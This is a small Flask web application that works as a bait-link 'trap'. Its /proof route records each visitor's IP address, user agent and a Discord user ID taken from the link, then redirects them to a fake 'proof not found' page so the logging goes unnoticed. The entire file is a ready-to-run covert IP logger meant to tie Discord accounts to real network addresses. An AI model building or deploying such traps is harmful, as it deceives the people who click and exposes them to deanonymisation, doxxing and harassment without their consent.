from flask import Flask, request, redirect
import json
import os
from datetime import datetime

app = Flask(__name__)

LOG_FILE = "trap_visits.json"

# Ensure the log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

@app.route("/proof")
def trap():
    user_id = request.args.get("id", "unknown")
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get("User-Agent", "unknown")
    timestamp = datetime.utcnow().isoformat()

    log_entry = {
        "timestamp": timestamp,
        "ip": ip,
        "user_agent": user_agent,
        "discord_user_id": user_id
    }

    # Save to log file
    with open(LOG_FILE, "r+") as f:
        data = json.load(f)
        data.append(log_entry)
        f.seek(0)
        json.dump(data, f, indent=4)

    # Redirect after logging
    return redirect("https://example.com/fake-proof-not-found")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
